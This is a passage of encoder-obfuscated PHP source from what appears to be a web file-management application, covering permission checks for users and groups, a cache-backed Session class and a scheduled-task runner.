Model($ìıâÓ•œ[522])->getInfo($¯æçœïÃ); $ıàŞ‹¯Á = explode($ìıâÓ•œ[50], trim($„Ø½‰û×[$ìıâÓ•œ[521]], $ìıâÓ•œ[50])); $ıàŞ‹¯Á = array_reverse($ıàŞ‹¯Á); foreach ($ıàŞ‹¯Á as $™üÂ²Ñ®) { if ($™üÂ²Ñ® == $ìıâÓ•œ[197] || $™üÂ²Ñ® == $€®Ê¥Åì) { continue; } $ºíÒ½‚Ç = $this->groupRootAuth($™üÂ²Ñ®, $£İôïãà); if (!$ºíÒ½‚Ç) { continue; } $üß¹ã†Œ = $this->groupAuthInfo($ºíÒ½‚Ç, $™üÂ²Ñ®); break; } } if (!$üß¹ã†Œ || $üß¹ã†Œ[$ìıâÓ•œ[414]] <= 0) { $—®Ñ’úÑ = $this->authDeepCheck($İœ™¿Íê[$ìıâÓ•œ[402]], $£İôïãà); if ($—®Ñ’úÑ) { $üß¹ã†Œ = $—®Ñ’úÑ; } } return $üß¹ã†Œ; } private function userIsRoot($£…Ğ”‰ = false) { $·œÖª¡¹ =& $_SERVER[ä¿÷‹µ±]; if (!$£…Ğ”‰ && _get($GLOBALS, $·œÖª¡¹[503])) { return !0; } $¨©…ˆ® = Model($·œÖª¡¹[535])->getInfo($£…Ğ”‰); $™€éåÑ­ = Model($·œÖª¡¹[2047])->listData($¨©…ˆ®[$·œÖª¡¹[1556]]); if ($™€éåÑ­ && $™€éåÑ­[$·œÖª¡¹[511]][$·œÖª¡¹[2048]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¡ŞæÍ¼¸) { $ÛÅüÂê– =& $_SERVER[ä¿÷‹µ±]; $ŒØÏ¸ç¡ = Model($ÛÅüÂê–[1349]); $ª¶ÒÕë» = $ŒØÏ¸ç¡->sourceInfo($¡ŞæÍ¼¸); if (!$ª¶ÒÕë») { return !1; } $ŒØÏ¸ç¡->groupPathDisplay($ª¶ÒÕë»); $¬úˆŞıÑ = array($ª¶ÒÕë»); $¬úˆŞıÑ = $ŒØÏ¸ç¡->_listAppendPath($¬úˆŞıÑ); $ª¶ÒÕë» = $¬úˆŞıÑ[0]; $÷ÇÛãÏƒ = $ª¶ÒÕë»[$ÛÅüÂê–[519]]; if (isset($ª¶ÒÕë»[$ÛÅüÂê–[527]])) { $ç±«Ì™ñ = explode($ÛÅüÂê–[8], trim($ª¶ÒÕë»[$ÛÅüÂê–[519]], $ÛÅüÂê–[8])); array_shift($ç±«Ì™ñ); $÷ÇÛãÏƒ = $ª¶ÒÕë»[$ÛÅüÂê–[525]] . $ÛÅüÂê–[2049] . implode($ÛÅüÂê–[8], $ç±«Ì™ñ); } return array($ÛÅüÂê–[420] => $ª¶ÒÕë»[$ÛÅüÂê–[32]], $ÛÅüÂê–[84] => KodIO::make($ª¶ÒÕë»[$ÛÅüÂê–[402]]), $ÛÅüÂê–[2050] => $÷ÇÛãÏƒ); } private function groupAuthInfo($±çÜßì¨, $€Ëü›à±) { $Á¡×“…ø =& $_SERVER[ä¿÷‹µ±]; $úê÷²Ç« = Model($Á¡×“…ø[522])->getInfo($€Ëü›à±); return array($Á¡×“…ø[2051] => intval($±çÜßì¨[$Á¡×“…ø[413]]), $Á¡×“…ø[2035] => $±çÜßì¨, $Á¡×“…ø[2052] => LNG($Á¡×“…ø[2053]), $Á¡×“…ø[2044] => array($Á¡×“…ø[420] => $úê÷²Ç«[$Á¡×“…ø[32]], $Á¡×“…ø[84] => KodIO::make($úê÷²Ç«[$Á¡×“…ø[86]][$Á¡×“…ø[402]]), $Á¡×“…ø[2050] => $úê÷²Ç«[$Á¡×“…ø[526]])); } protected function groupRootAuth($ÜŸæÙ•¥, $“‹ë‹ƒè = false) { $ÆñÆ×çö =& $_SERVER[ä¿÷‹µ±]; $“‹ë‹ƒè = $“‹ë‹ƒè ? $“‹ë‹ƒè : USER_ID; $ºİí¿“ = $“‹ë‹ƒè . $ÆñÆ×çö[2054] . $ÜŸæÙ•¥; static $Éş€Îİ· = array(); if (isset($Éş€Îİ·[$ºİí¿“])) { return $Éş€Îİ·[$ºİí¿“]; } $—µ–Àé€ = Model($ÆñÆ×çö[522])->getInfo($ÜŸæÙ•¥); $Íüõ’ñ = $this->userGroupList($“‹ë‹ƒè); $Í¬‰ÍÚè = isset($Íüõ’ñ[$ÜŸæÙ•¥]) ? $Íüõ’ñ[$ÜŸæÙ•¥][$ÆñÆ×çö[413]] : !1; if ($Í¬‰ÍÚè && Model($ÆñÆ×çö[507])->authCheckAction($Í¬‰ÍÚè[$ÆñÆ×çö[413]], $ÆñÆ×çö[1871])) { $Éş€Îİ·[$ºİí¿“] = $Í¬‰ÍÚè; return $Í¬‰ÍÚè; } $¤¤•±äô = $this->sourceAuthSelect($—µ–Àé€[$ÆñÆ×çö[86]][$ÆñÆ×çö[402]]); $ÌûÙü—ö = $¤¤•±äô ? $this->authMake($¤¤•±äô, $“‹ë‹ƒè) : !1; $ºÅ“œìó = $ÌûÙü—ö ? $ÌûÙü—ö[$ÆñÆ×çö[467]] : !1; $Éş€Îİ·[$ºİí¿“] = $ºÅ“œìó ? $ºÅ“œìó : $Í¬‰ÍÚè; return $Éş€Îİ·[$ºİí¿“]; } public function authOwnerApply($¢ƒŞØî¨) { $ÇÁ¾†‘ =& $_SERVER[ä¿÷‹µ±]; if (empty($¢ƒŞØî¨[$ÇÁ¾†‘[413]]) || isset($¢ƒŞØî¨[$ÇÁ¾†‘[2055]]) && $¢ƒŞØî¨[$ÇÁ¾†‘[2055]]) { return $¢ƒŞØî¨; } if (AuthModel::authCheckRoot($¢ƒŞØî¨[$ÇÁ¾†‘[413]][$ÇÁ¾†‘[414]])) { return $¢ƒŞØî¨; } $Í²Ùß× = Model($ÇÁ¾†‘[1349])->parentLevelArray($¢ƒŞØî¨[$ÇÁ¾†‘[521]]); $Í²Ùß× = array_merge(array($¢ƒŞØî¨[$ÇÁ¾†‘[402]]), array_reverse($Í²Ùß×)); $úòŒòá× = $this->sourceAuthSelect($Í²Ùß×); $íœâ¥Ç = array(); $›º‰–ì = array(); foreach ($úòŒòá× as $İÑ›íÎ¥ => $Üò¹¢À¥) { $¥³ğ¦… = $this->authFolderOwnerUser($Üò¹¢À¥); $íœâ¥Ç[$İÑ›íÎ¥] = $¥³ğ¦…; $›º‰–ì = array_merge($›º‰–ì, $¥³ğ¦…[$ÇÁ¾†‘[600]]); if ($¥³ğ¦…[$ÇÁ¾†‘[2056]]) { break; } } if (count($›º‰–ì) == 0) { $›º‰–ì = $this->authFolderOwnerGroup($¢ƒŞØî¨[$ÇÁ¾†‘[505]]); } $›º‰–ì = array_unique($›º‰–ì); if (AuthModel::authCheckRoot($¢ƒŞØî¨[$ÇÁ¾†‘[413]][$ÇÁ¾†‘[414]])) { $›º‰–ì[] = USER_ID; } $¢ƒŞØî¨[$ÇÁ¾†‘[413]][$ÇÁ¾†‘[2057]] = Model($ÇÁ¾†‘[513])->userListInfo($›º‰–ì); return $¢ƒŞØî¨; } private function authFolderOwnerGroup($Á¤•²â ) { $è²Êõæû =& $_SERVER[ä¿÷‹µ±]; $“ÚÒ¼ëÎ = Model($è²Êõæû[1940])->where(array($è²Êõæû[1850] => $Á¤•²â ))->select(); $ƒ©º¤Õ¶ = array(); if (!$“ÚÒ¼ëÎ) { return $ƒ©º¤Õ¶; } foreach ($“ÚÒ¼ëÎ as $Ñ»­×æ…) { $êäè½²ˆ = $this->authInfo($Ñ»­×æ…); if (AuthModel::authCheckRoot($êäè½²ˆ[$è²Êõæû[413]])) { $ƒ©º¤Õ¶[] = $Ñ»­×æ…[$è²Êõæû[1678]]; } } return $ƒ©º¤Õ¶; } private function authFolderOwnerUser($ÕÎÕœ¼¼) { $†·…ºç =& $_SERVER[ä¿÷‹µ±]; $·êúìÂû = array(); $âˆ¨àˆê = !1; foreach ($ÕÎÕœ¼¼ as $†“êïü†) { $¿„–¥Ö¹ = $this->authInfo($†“êïü†); if ($†“êïü†[$†·…ºç[505]] == $†·…ºç[197]) { $âˆ¨àˆê = !0; } if ($†“êïü†[$†·…ºç[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¿„–¥Ö¹[$†·…ºç[413]])) { $·êúìÂû[] = $†“êïü†[$†·…ºç[505]]; } } } return array($†·…ºç[600] => $·êúìÂû, $†·…ºç[2056] => $âˆ¨àˆê); } public function authMake($Ïí®•§¹, $à†îİãı = false) { $¤ ‘á›’ =& $_SERVER[ä¿÷‹µ±]; $úÂŒ ç¦ = $this->authArrayCheck($Ïí®•§¹, $à†îİãı); if ($úÂŒ ç¦[$¤ ‘á›’[2058]]) { $úÂŒ ç¦[$¤ ‘á›’[2058]] = $this->sourceAuthInfo($úÂŒ ç¦[$¤ ‘á›’[2058]]); } return $úÂŒ ç¦; } public function authArrayCheck($ŞÉ…µÉî, $•ÎÄñÄ® = false) { $‹Â£‘¸Œ =& $_SERVER[ä¿÷‹µ±]; if (!$ŞÉ…µÉî) { return array($‹Â£‘¸Œ[414] => 0, $‹Â£‘¸Œ[467] => !1); } $•ÎÄñÄ® = $•ÎÄñÄ® ? $•ÎÄñÄ® : USER_ID; $¸¢šÛ¥Ç = 0; $›Á×èá = 0; $ÈÆË‰¥œ = 0; $üşõñà¿ = 0; $º†ë›æ» = 0; $»‘¡ıô€ = 0; $¸Ù®€î = 1000; $ÑãüÇµï = 0; $Í°ñ¶ = 0; $ôËÒ×‚ = 0; $œ›²¾É = 0; $Â„È·¿™ = array($‹Â£‘¸Œ[402] => 0); foreach ($ŞÉ…µÉî as $Â„È·¿™) { $î“¨öŞ = $this->authInfo($Â„È·¿™); if (!$î“¨öŞ) { continue; } $µ÷ÎÕÍØ = $Â„È·¿™[$‹Â£‘¸Œ[505]]; $›œ—Ş™š = intval($î“¨öŞ[$‹Â£‘¸Œ[413]]); if ($Â„È·¿™[$‹Â£‘¸Œ[411]] == SourceModel::TYPE_USER && $µ÷ÎÕÍØ == $•ÎÄñÄ®) { $¸¢šÛ¥Ç = !0; $ÈÆË‰¥œ = $î“¨öŞ; $›Á×èá = $›œ—Ş™š; } else { if ($Â„È·¿™[$‹Â£‘¸Œ[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($µ÷ÎÕÍØ, $•ÎÄñÄ®)) { $üşõñà¿ = !0; $Õİ°ê = $this->groupStepToUserGroup($µ÷ÎÕÍØ, $•ÎÄñÄ®); if ($Õİ°ê < $¸Ù®€î) { $¸Ù®€î = $Õİ°ê; $º†ë›æ» = $›œ—Ş™š; $»‘¡ıô€ = $î“¨öŞ; $ÑãüÇµï = $µ÷ÎÕÍØ; } if ($Õİ°ê == $¸Ù®€î && $›œ—Ş™š >= $º†ë›æ») { $º†ë›æ» = $›œ—Ş™š; $»‘¡ıô€ = $î“¨öŞ; $ÑãüÇµï = $µ÷ÎÕÍØ; } } else { if ($µ÷ÎÕÍØ == $‹Â£‘¸Œ[197]) { $Í°ñ¶ = !0; $œ›²¾É = $î“¨öŞ; $ôËÒ×‚ = $›œ—Ş™š; } } } } if ($¸¢šÛ¥Ç) { $ƒÜššå = $›Á×èá; $î“¨öŞ = $ÈÆË‰¥œ; $¾¤å‰Ç = LNG($‹Â£‘¸Œ[2059]); } else { if ($üşõñà¿) { $ƒÜššå = $º†ë›æ»; $î“¨öŞ = $»‘¡ıô€; $í˜æÛ‹Ú = Model($‹Â£‘¸Œ[522])->getInfo($ÑãüÇµï); $¾¤å‰Ç = $‹Â£‘¸Œ[162] . $í˜æÛ‹Ú[$‹Â£‘¸Œ[526]] . $‹Â£‘¸Œ[2060] . LNG($‹Â£‘¸Œ[2061]); } else { if ($Í°ñ¶) { $ƒÜššå = $ôËÒ×‚; $î“¨öŞ = $œ›²¾É; $¾¤å‰Ç = LNG($‹Â£‘¸Œ[2032]); } else { $ƒÜššå = 0; $î“¨öŞ = !1; $¾¤å‰Ç = $‹Â£‘¸Œ[12]; } } } $×ÑÓ¼«‰ = array($‹Â£‘¸Œ[2051] => intval($ƒÜššå), $‹Â£‘¸Œ[2035] => $î“¨öŞ, $‹Â£‘¸Œ[2052] => $¾¤å‰Ç, $‹Â£‘¸Œ[2044] => $Â„È·¿™[$‹Â£‘¸Œ[402]]); return $×ÑÓ¼«‰; } private function groupContainUser($™ğ«Ó™˜, $ñœŠŒá = false) { return in_array($™ğ«Ó™˜, $this->userGroupParents($ñœŠŒá)); } private function groupStepToUserGroup($Œµ¤¦äŞ, $äö‘†ğò = false) { $³÷¤íáš =& $_SERVER[ä¿÷‹µ±]; $“Ş­ŸáÙ = $this->userGroupList($äö‘†ğò); $Ï‡ÖÓ°õ = 1000; $ŸãŞõõ½ = $GLOBALS[$³÷¤íáš[6]][$³÷¤íáš[89]][$³÷¤íáš[1953]] == 1; $È¡÷‘ŞÆ = $ŸãŞõõ½ ? 3 : 2; foreach ($“Ş­ŸáÙ as $À¼æË–ˆ) { if ($À¼æË–ˆ[$³÷¤íáš[1850]] == $Œµ¤¦äŞ) { return 0; } $¼¢ãà— = explode($³÷¤íáš[50], trim($À¼æË–ˆ[$³÷¤íáš[521]], $³÷¤íáš[50])); if ($¼¢ãà—[0] == $³÷¤íáš[197] && count($¼¢ãà—) > $È¡÷‘ŞÆ) { $š–Èé˜š = array_reverse(array_slice($¼¢ãà—, $È¡÷‘ŞÆ)); $ö±Íö÷” = array_search($Œµ¤¦äŞ, $š–Èé˜š); if ($ö±Íö÷” !== !1 && $ö±Íö÷” + 1 <= $Ï‡ÖÓ°õ) { $Ï‡ÖÓ°õ = $ö±Íö÷” + 1; } } } return $Ï‡ÖÓ°õ; } private function userGroupList($š¢´š = false) { $ó² ·»º =& $_SERVER[ä¿÷‹µ±]; static $Û°İ÷ö = array(); if (isset($Û°İ÷ö[$š¢´š])) { return $Û°İ÷ö[$š¢´š]; } $ãü´‹“û = Model($ó² ·»º[535])->getInfo($š¢´š); $Û°İ÷ö[$š¢´š] = array_to_keyvalue($ãü´‹“û[$ó² ·»º[2033]], $ó² ·»º[1850]); return $Û°İ÷ö[$š¢´š]; } public function userGroupParents($ûØƒ„Õ) { $ÌŸÂî° =& $_SERVER[ä¿÷‹µ±]; static $ÌøÄ×—Õ = array(); $ûØƒ„Õ = $ûØƒ„Õ ? $ûØƒ„Õ : USER_ID; if (isset($ÌøÄ×—Õ[$ûØƒ„Õ])) { return $ÌøÄ×—Õ[$ûØƒ„Õ]; } $¢——êêÑ = $this->userGroupList($ûØƒ„Õ); $¬œ›÷ãü = array(); $¤¬èÎÊ = $GLOBALS[$ÌŸÂî°[6]][$ÌŸÂî°[89]][$ÌŸÂî°[1953]] == 1; $»ƒ“·Öî = $¤¬èÎÊ ? 3 : 2; foreach ($¢——êêÑ as $®Á÷İñê) { $­Â´ = array($®Á÷İñê[$ÌŸÂî°[1850]]); $ø¸¤ëØÈ = explode($ÌŸÂî°[50], trim($®Á÷İñê[$ÌŸÂî°[521]], $ÌŸÂî°[50])); if ($ø¸¤ëØÈ[0] == $ÌŸÂî°[197] && count($ø¸¤ëØÈ) > $»ƒ“·Öî) { $èØ¾„ìµ = array_slice($ø¸¤ëØÈ, $»ƒ“·Öî); $­Â´ = array_merge($­Â´, array_reverse($èØ¾„ìµ)); } $¬œ›÷ãü = array_merge($¬œ›÷ãü, $­Â´); } $ÌøÄ×—Õ[$ûØƒ„Õ] = array_unique($¬œ›÷ãü); return $ÌøÄ×—Õ[$ûØƒ„Õ]; } public function authTargetInfoMake($™İß»ÏÚ) { $ùÓğı…â =& $_SERVER[ä¿÷‹µ±]; $Ì™Í™º§ = array(); $°ÍØĞ = array(); foreach ($™İß»ÏÚ as $ƒùÖÇû) { if ($ƒùÖÇû[$ùÓğı…â[411]] == SourceModel::TYPE_USER) { $Ì™Í™º§[] = intval($ƒùÖÇû[$ùÓğı…â[505]]); } else { if ($ƒùÖÇû[$ùÓğı…â[411]] == SourceModel::TYPE_GROUP) { $°ÍØĞ[] = intval($ƒùÖÇû[$ùÓğı…â[505]]); } } } if ($Ì™Í™º§) { $Ì™Í™º§ = Model($ùÓğı…â[513])->userListInfo($Ì™Í™º§); } if ($°ÍØĞ) { $š‚¡ÅŞÒ = array($ùÓğı…â[1938] => array($ùÓğı…â[418], $°ÍØĞ)); $°ÍØĞ = Model($ùÓğı…â[522])->field($ùÓğı…â[2062])->where($š‚¡ÅŞÒ)->select(); $°ÍØĞ = array_to_keyvalue($°ÍØĞ, $ùÓğı…â[1850]); } return array($ùÓğı…â[2063] => $Ì™Í™º§, $ùÓğı…â[2064] => $°ÍØĞ); } public function authInfo($„¤Ï¸óÔ) { $£à§ä´Ş =& $_SERVER[ä¿÷‹µ±]; if ($„¤Ï¸óÔ[$£à§ä´Ş[1954]]) { $êßñ©ç = Model($£à§ä´Ş[507])->listData($„¤Ï¸óÔ[$£à§ä´Ş[1954]]); if (!$êßñ©ç) { return !1; $°ü´‰ù¤ = Model($£à§ä´Ş[507])->listData(); $ïç™›Õç = array_filter_by_field($°ü´‰ù¤, $£à§ä´Ş[413], $£à§ä´Ş[197]); return $ïç™›Õç; } $íÄˆ¯²õ = array_field_key($êßñ©ç, array($£à§ä´Ş[399], $£à§ä´Ş[32], $£à§ä´Ş[413], $£à§ä´Ş[1873], $£à§ä´Ş[1874])); $íÄˆ¯²õ[$£à§ä´Ş[2065]] = $„¤Ï¸óÔ; return $íÄˆ¯²õ; } else { return array($£à§ä´Ş[419] => 0, $£à§ä´Ş[1856] => $„¤Ï¸óÔ[$£à§ä´Ş[2010]], $£à§ä´Ş[420] => $£à§ä´Ş[12], $£à§ä´Ş[1873] => $£à§ä´Ş[2066]); } } } goto cÑªá¿—†ˆ; D”¬ƒŸœÕØ: define($_SERVER[ä¿÷‹µ±][241], 1); define($_SERVER[ä¿÷‹µ±][242], 0); define($_SERVER[ä¿÷‹µ±][243], 2); goto Aõ‘¥¬†ŠÀ; f”³ÖæĞŠ»: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Š˜šŒˆ =& $_SERVER[ä¿÷‹µ±]; static $Ä…¬Ä›ê = false; if ($Ä…¬Ä›ê) { return $Ä…¬Ä›ê; } $±¡Öœò— = $GLOBALS[$Š˜šŒˆ[6]][$Š˜šŒˆ[349]]; self::$sessionTime = $±¡Öœò—[$Š˜šŒˆ[1633]]; $Øı‚ÁÁî = isset($GLOBALS[$Š˜šŒˆ[1634]]) ? $GLOBALS[$Š˜šŒˆ[1634]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Øı‚ÁÁî)) { self::$sessionSign = Cookie::get($Øı‚ÁÁî); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Øı‚ÁÁî, self::$sessionSign, self::$sessionTime); $Şæ¶§í± = $±¡Öœò—[$Š˜šŒˆ[1635]]; $íÙâ‘ø¤ = $±¡Öœò—[$Şæ¶§í±]; $¼İ¯Ç = $±¡Öœò—[$Š˜šŒˆ[847]]; switch ($Şæ¶§í±) { case $Š˜šŒˆ[21]: self::$handle = Model($Š˜šŒˆ[848]); break; case $Š˜šŒˆ[849]: self::$handle = new CacheRedis($íÙâ‘ø¤, $¼İ¯Ç); break; case $Š˜šŒˆ[850]: self::$handle = new CacheMemcached($íÙâ‘ø¤, $¼İ¯Ç); break; case $Š˜šŒˆ[199]: $íÙâ‘ø¤[$Š˜šŒˆ[84]] = $íÙâ‘ø¤[$Š˜šŒˆ[84]] . $Š˜šŒˆ[1636]; self::$handle = new CacheFile($íÙâ‘ø¤, $¼İ¯Ç); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ä…¬Ä›ê = new self(); return $Ä…¬Ä›ê; } public static function getBySign($ÛÜ²Ãã) { CacheLock::lock($ÛÜ²Ãã); $’»Ì¢›‡ = self::$handle->get($ÛÜ²Ãã); CacheLock::unlock($ÛÜ²Ãã); $’»Ì¢›‡ = unserialize($’»Ì¢›‡); return is_array($’»Ì¢›‡) ? $’»Ì¢›‡ : array(); } public static function setBySign($‚îƒñáÅ, $ĞÌ¯‚æ) { CacheLock::lock($‚îƒñáÅ); self::$handle->set($‚îƒñáÅ, serialize($ĞÌ¯‚æ), self::$sessionTime); CacheLock::unlock($‚îƒñáÅ); } public static function sign($ùÒ˜”õ› = false) { $ùÒ˜”õ› && (self::$sessionSign = $ùÒ˜”õ›); self::init(); return self::$sessionSign; } public static function set($ô–ŠÑ§ä, $ºßä†’Œ = false) { self::init(); if (is_array($ô–ŠÑ§ä)) { foreach ($ô–ŠÑ§ä as $·˜şÙÉØ => $´‡¨Î¶‹) { array_set_value(self::$data, $·˜şÙÉØ, $´‡¨Î¶‹); } } else { array_set_value(self::$data, $ô–ŠÑ§ä, $ºßä†’Œ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ğàãõß¤ = false) { self::init(); if (!$ğàãõß¤) { return self::$data; } return array_get_value(self::$data, $ğàãõß¤); } public static function remove($¨ºâ­Ó°) { self::init(); unset(self::$data[$¨ºâ­Ó°]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ä¿÷‹µ±][852])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $üÚ¨çŒ­ =& $_SERVER[ä¿÷‹µ±]; if (self::valueGet($üÚ¨çŒ­[769]) != $üÚ¨çŒ­[88]) { return; } if (self::valueGet($üÚ¨çŒ­[1637]) == $üÚ¨çŒ­[88]) { $ÁÆÑüÑô = self::valueGet($üÚ¨çŒ­[1638]); if (time() - $ÁÆÑüÑô > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$üÚ¨çŒ­[1639]] = 1; self::valueSet($üÚ¨çŒ­[1637], $üÚ¨çŒ­[88]); self::log($üÚ¨çŒ­[1640] . ACTION . $üÚ¨çŒ­[1641]); Session::$data = array(); Session::$sessionSign = $üÚ¨çŒ­[12]; $GLOBALS[$üÚ¨çŒ­[503]] = 1; Hook::bind($üÚ¨çŒ­[1642], $üÚ¨çŒ­[1643]); $»„‹Æùé = 0; while (!0) { self::cacheClear(); if (self::valueGet($üÚ¨çŒ­[769]) != $üÚ¨çŒ­[88]) { self::valueSet($üÚ¨çŒ­[1637], $üÚ¨çŒ­[197]); self::log($üÚ¨çŒ­[1644]); die; } $»ŞØÍ½ = time(); if ($»ŞØÍ½ - $»„‹Æùé >= 60) { self::valueSet(array($üÚ¨çŒ­[1637] => $üÚ¨çŒ­[88], $üÚ¨çŒ­[1638] => $»ŞØÍ½), !1); $»„‹Æùé = $»ŞØÍ½; } if (!file_exists(USER_SYSTEM . $üÚ¨çŒ­[1645])) { self::valueSet(array($üÚ¨çŒ­[1637] => $üÚ¨çŒ­[197], $üÚ¨çŒ­[769] => $üÚ¨çŒ­[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $´õ–¤¸© =& $_SERVER[ä¿÷‹µ±]; http_close(); self::valueSet($´õ–¤¸©[769], $´õ–¤¸©[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($´õ–¤¸©[1637] => $´õ–¤¸©[197], $´õ–¤¸©[769] => $´õ–¤¸©[88]), !1); } public static function taskSwitch() { $—¨È™Òİ =& $_SERVER[ä¿÷‹µ±]; $°²³Êêë = self::valueGet($—¨È™Òİ[769]) == $—¨È™Òİ[88] ? $—¨È™Òİ[197] : $—¨È™Òİ[88]; self::valueSet($—¨È™Òİ[769], $°²³Êêë); } public static function shutdownEvent() { $¢æıÉµ =& $_SERVER[ä¿÷‹µ±]; self::valueSet($¢æıÉµ[1637], $¢æıÉµ[197]); self::log($¢æıÉµ[1646]); } public static function config($­§–û ¾, $–Æ¼½Îı) { self::valueSet($_SERVER[ä¿÷‹µ±][769], $­§–û ¾); } private static function taskRunAll() { $Ã‘Âüá¡ =& $_SERVER[ä¿÷‹µ±]; $––†Ó› = timeFloat(); $ŞæüÔ ³ = Model($Ã‘Âüá¡[1647])->listData(); $šö—ªˆä = count($ŞæüÔ ³); for ($À…“Ğ½à = 0; $À…“Ğ½à < $šö—ªˆä; $À…“Ğ½à++) { $À†‹Áú˜ = $ŞæüÔ ³[$À…“Ğ½à]; if (!$À†‹Áú˜[$Ã‘Âüá¡[399]] || $À†‹Áú˜[$Ã‘Âüá¡[1648]] != $Ã‘Âüá¡[88]) { continue; } if (!self::taskTimeCheck($À†‹Áú˜)) { continue; } self::taskRun($À†‹Áú˜); } Hook::trigger($Ã‘Âüá¡[1649]); self::taskQueueRun($––†Ó›); } private static function taskQueueRun($Çº£½Éî) { $·óÎ¸º£ = 10; while (!0) { $Ÿ®Í— Ù = TaskQueue::run(); if ($Ÿ®Í— Ù === !1) { break; } if (timeFloat() - $Çº£½Éî >= $·óÎ¸º£) { break; } } } private static function taskTimeCheck($™‹…ùÃ) { $ˆ°ş²¼Å =& $_SERVER[ä¿÷‹µ±]; $»¹œı ³ = json_decode($™‹…ùÃ[$ˆ°ş²¼Å[203]], !0); $ãªŒùù¬ = intval($™‹…ùÃ[$ˆ°ş²¼Å[1638]]); $ÒáÚçˆî = strtotime($ˆ°ş²¼Å[1650] . $»¹œı ³[$ˆ°ş²¼Å[1651]] . $ˆ°ş²¼Å[1652]) - strtotime($ˆ°ş²¼Å[1653]); $ÖŒ¸ìƒÃ = time() - strtotime(date($ˆ°ş²¼Å[1654]) . $ˆ°ş²¼Å[1655]); $÷Ñı¼­ı = $ÖŒ¸ìƒÃ >= $ÒáÚçˆî && $ÖŒ¸ìƒÃ <= $ÒáÚçˆî + 3600; switch ($»¹œı ³[$ˆ°ş²¼Å[33]]) { case $ˆ°ş²¼Å[1656]: if (time() - $ãªŒùù¬ < 3600 * 24 * 30) { return !1; } if ($»¹œı ³[$ˆ°ş²¼Å[1656]] == date($ˆ°ş²¼Å[1657]) && $÷Ñı¼­ı) { return !0; } break; case $ˆ°ş²¼Å[1658]: if (time() - $ãªŒùù¬ < 3600 * 24 * 7) { return !1; } $¾Ú¨Ùı = date($ˆ°ş²¼Å[1659]) == 0 ? 7 : date($ˆ°ş²¼Å[1659]); if ($»¹œı ³[$ˆ°ş²¼Å[1658]] == $¾Ú¨Ùı && $÷Ñı¼­ı) { return !0; } break; case $ˆ°ş²¼Å[1651]: if (time() - $ãªŒùù¬ < 3600 * 24) { return !1; } if ($÷Ñı¼­ı) { return !0; } break; case $ˆ°ş²¼Å[1660]: if (time() - $ãªŒùù¬ >= floatval($»¹œı ³[$ˆ°ş²¼Å[1660]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $­õõöÇ =& $_SERVER[ä¿÷‹µ±]; static $œ­„÷ë = 0; $»ß¨Ä‹ò = 300; if (!$œ­„÷ë) { $œ­„÷ë = time(); } if (time() - $œ­„÷ë < $»ß¨Ä‹ò) { return; } $œ­„÷ë = time(); $Ë×ÜÑ†• = Model($­õõöÇ[513])->db($­õõöÇ[12]); if ($Ë×ÜÑ†•) { $Ë×ÜÑ†•->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($­õõöÇ[1661], $­õõöÇ[1662]); die; } } public static function taskRun($’™™Ææğ) { $ú·°£’Ñ =& $_SERVER[ä¿÷‹µ±]; self::log($ú·°£’Ñ[1663] . $’™™Ææğ[$ú·°£’Ñ[399]] . $ú·°£’Ñ[1664] . $’™™Ææğ[$ú·°£’Ñ[32]] . $ú·°£’Ñ[1665] . $’™™Ææğ[$ú·°£’Ñ[1666]]); Model($ú·°£’Ñ[1647])->run($’™™Ææğ[$ú·°£’Ñ[399]]); $Üñ¦ùğì = timeFloat(); $Å€³¬•Í = $ú·°£’Ñ[12]; switch ($’™™Ææğ[$ú·°£’Ñ[33]]) { case $ú·°£’Ñ[307]: $¥ÔŸá÷ù = url_request($’™™Ææğ[$ú·°£’Ñ[1666]], $ú·°£’Ñ[230], !1, !1, !1, !1, 10); if ($¥ÔŸá÷ù[$ú·°£’Ñ[769]]) { $Å€³¬•Í = strlen($¥ÔŸá÷ù[$ú·°£’Ñ[1215]]); } break; case $ú·°£’Ñ[229]: $Å€³¬•Í = Hook::apply($’™™Ææğ[$ú·°£’Ñ[1666]]); default: break; } Model($ú·°£’Ñ[1667])->add(array($ú·°£’Ñ[1668] => $ú·°£’Ñ[12], $ú·°£’Ñ[1669] => $ú·°£’Ñ[197], $ú·°£’Ñ[33] => $ú·°£’Ñ[1670] . $’™™Ææğ[$ú·°£’Ñ[399]], $ú·°£’Ñ[1671] => json_encode(array($ú·°£’Ñ[32] => $’™™Ææğ[$ú·°£’Ñ[32]], $ú·°£’Ñ[1672] => timeFloat() - $Üñ¦ùğì, $ú·°£’Ñ[293] => $Å€³¬•Í)))); $ø³·˜½Ñ = $Å€³¬•Í ? $ú·°£’Ñ[1673] . $Å€³¬•Í : $ú·°£’Ñ[12]; self::log($ú·°£’Ñ[1674] . $’™™Ææğ[$ú·°£’Ñ[399]] . $ú·°£’Ñ[164] . $ø³·˜½Ñ); return !0; } private static function valueGet($è’Í­Ø) { $ÛËÊäõä =& $_SERVER[ä¿÷‹µ±]; $€í°Œ = $ÛËÊäõä[1675]; $“³°Ææ¤ = Model($ÛËÊäõä[435])->get($è’Í­Ø, $€í°Œ); if (is_null($“³°Ææ¤)) { Model($ÛËÊäõä[435])->set($ÛËÊäõä[769], $ÛËÊäõä[88], $€í°Œ); Model($ÛËÊäõä[435])->set($ÛËÊäõä[1637], $ÛËÊäõä[197], $€í°Œ); $“³°Ææ¤ = Model($ÛËÊäõä[435])->get($è’Í­Ø, $€í°Œ); } return 